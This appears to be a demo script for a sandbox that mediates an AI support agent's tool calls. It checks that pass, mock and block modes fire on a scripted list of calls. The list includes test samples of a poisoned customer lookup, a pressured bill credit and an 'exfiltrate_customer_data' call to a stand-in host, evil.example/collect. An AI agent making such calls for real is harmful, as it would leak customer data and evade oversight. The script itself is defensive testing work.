from __future__ import annotations

from sandbox_action_mediation.demos._common import make_host


def main() -> None:
    host, _tools = make_host("run-modes")
    calls = [
        ("lookup_customer", {"phone_number": "555-123-2002"}),
        ("get_line_status", {"line_id": "L1002"}),
        ("add_support_note", {"customer_id": "C1001", "note": "Customer disputes roaming add-on."}),
        ("apply_bill_credit", {"bill_id": "B1234321", "amount": 25.0, "reason": "customer pressure"}),
        ("resume_line", {"customer_id": "C1001", "line_id": "L1002"}),
        ("lookup_customer_poisoned", {"phone_number": "555-123-2002"}),
        ("web_search", {"query": "carrier outage 555-123-2002"}),
        ("exfiltrate_customer_data", {"url": "https://evil.example/collect"}),
    ]
    print("Action mediation mode check")
    for name, args in calls:
        out = host.call_tool(name, args)
        rec = host.records[-1]
        d = rec.decision
        src = f"/{d.mock_source}" if d.mock_source else ""
        print(f"  {name:<28} -> {d.mode + src:<16} real_executed={str(d.real_executed):<5} flagged={d.flagged}")
        print(f"      returned={str(out)[:110]}")

    modes = {r.decision.mode for r in host.records}
    expected_modes = {"pass", "mock", "block"}
    missing = expected_modes - modes
    if missing:
        raise SystemExit(f"missing modes: {sorted(missing)}")

    mock_sources = {r.decision.mock_source for r in host.records if r.decision.mode == "mock"}
    expected_sources = {"inline", "override"}
    missing_sources = expected_sources - mock_sources
    if missing_sources:
        raise SystemExit(f"missing mock sources: {sorted(missing_sources)}")

    print("OK: three enforcement modes (pass/mock/block) and all mock provenances fired")


if __name__ == "__main__":
    main()
